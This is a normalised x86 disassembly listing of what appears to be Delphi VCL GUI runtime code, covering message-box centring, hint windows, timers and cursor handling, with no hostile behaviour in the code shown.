mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46d34c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_46414c
mov [ ebp - 0x10 ] eax
call sub_464068
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_46c2f0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46d4a1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4a8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_464200
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_464070
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46d4b4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d56f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403fb8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46cd78
mov eax [ ebp - 0x108 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
mov eax ebx
pop ecx
call sub_46d34c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d576
lea eax [ ebp - 0x108 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
call sub_4084f4
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c98
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402ab0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041e8
sub_46d58c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_453c24
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_453d8c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46dc30
test al al
je r-xdata
call sub_453a88
mov ebp eax
mov eax edi
call sub_453a88
mov ebp eax
mov eax esi
call sub_46dc30
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46d6f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d74c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46dc30
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e47c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d753
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_46d75c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d7b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46dc30
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e47c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d7bb
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_46d7cc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403190
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44d32c
jmp r-xdata
sub_46d81c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46adc8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46adb4
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax ebx
call sub_453a88
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46d880
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44ba38
mov edi eax
call sub_44a334
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44e340
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44e340
sub_46d8f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46da08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46d880
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46b930
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_44a29c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46dab8
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403670
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46de50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d81c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4205b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da0f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46da18
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46adac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46ad98
movzx edx di
xor ecx ecx
call sub_44e340
inc esi
dec ebx
jne r-xdata
sub_46da54
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46cb70
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46cb70
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46da18
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46dab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f74
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_446a44
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_459d88
xor eax eax
push ebp
push sub_46db3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46db4c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46dba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46adac
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46db4c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ad98
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46db4c
pop ecx
jmp r-xdata
mov eax ebx
call sub_453d8c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_453a88
push eax
call IsChild
test eax eax
jne r-xdata
sub_46dc30
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40578c
call sub_42baac
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46dc58
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46dc9c
push sub_46b988
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46de50
sub_46dcc4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b00
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44cca4
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_44ba38
call sub_46b968
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46de50
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b00
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44cca4
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46de50
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46dc58
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44e340
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46e0e8
jmp r-xdata
sub_46ddd4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46dc9c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46e0e8
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46de0c
jmp r-xdata
sub_46de0c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_453a88
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_453a88
push eax
call ShowWindow
sub_46de50
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46de0c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_46baf0
mov eax ebx
call sub_46dc9c
sub_46de88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46dfca
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425cac
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407c80
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46df9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425d64
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dfa2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46de78
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46de78
mov [ ebp - 0x4 ] eax
sub_46dfa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46dfdc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403190
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4030d8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46e03c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46e0d6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0dd
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_42486c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c448
mov ebx eax
inc ebx
sub_46e0e8
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40488c
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46e46e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46de50
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46dc58
jmp r-xdata
call sub_464318
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e475
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404950
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_44ba38
call sub_46b968
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46de88
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_46ad2c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44cb2c
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44ccd0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46b930
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44a258
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403fb8
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44e340
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46dfdc
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44cca4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44cca4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44d32c
mov eax [ ebp - 0x24 ]
push eax
